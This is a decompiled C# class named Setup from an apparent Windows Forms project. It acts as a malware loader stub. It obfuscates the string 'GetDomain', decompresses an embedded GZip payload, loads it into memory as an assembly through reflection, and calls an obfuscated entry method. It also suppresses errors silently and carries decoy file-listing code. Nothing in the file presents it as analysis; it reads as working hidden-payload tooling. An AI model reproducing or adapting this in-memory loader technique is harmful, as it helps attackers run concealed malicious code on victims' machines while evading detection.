using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp29;

public class Setup
{
	private byte[] GetPayload => Payload.GetPayload;

	public Setup()
	{
		ThreadStart threadStart = null;
		base._002Ector();
		threadStart = delegate
		{
			File();
		};
		new Thread(threadStart).Start();
	}

	private void File()
	{
		try
		{
			_ = Environment.UserName;
			List<string> list = new List<string>();
			string[] files = Directory.GetFiles(Application.get_StartupPath());
			foreach (string item in files)
			{
				list.Add(item);
				Thread.Sleep(1000);
			}
		}
		catch
		{
		}
	}

	public void Invoker()
	{
		try
		{
			string text = "Ge";
			if (text.Length > 0)
			{
				text += "tDo";
				text += "main";
			}
			AppDomain appDomain = null;
			appDomain = (AppDomain)typeof(Thread).GetMethod(text)!.Invoke(0, null);
			if (text != null)
			{
				byte[] rawAssembly = Decompress(GetPayload);
				Assembly assembly = appDomain.Load(rawAssembly);
				string typeName = assembly.GetExportedTypes()[0].ToString();
				Test(assembly.CreateInstance(typeName));
			}
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	private void Test(dynamic dynamic)
	{
		dynamic.D4gja3Ihd();
	}

	private byte[] Decompress(byte[] file)
	{
		using MemoryStream memoryStream = new MemoryStream(file);
		byte[] array = new byte[4];
		memoryStream.Read(array, 0, 4);
		int num = BitConverter.ToInt32(array, 0);
		using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array2 = new byte[num];
		gZipStream.Read(array2, 0, num);
		return array2;
	}
}
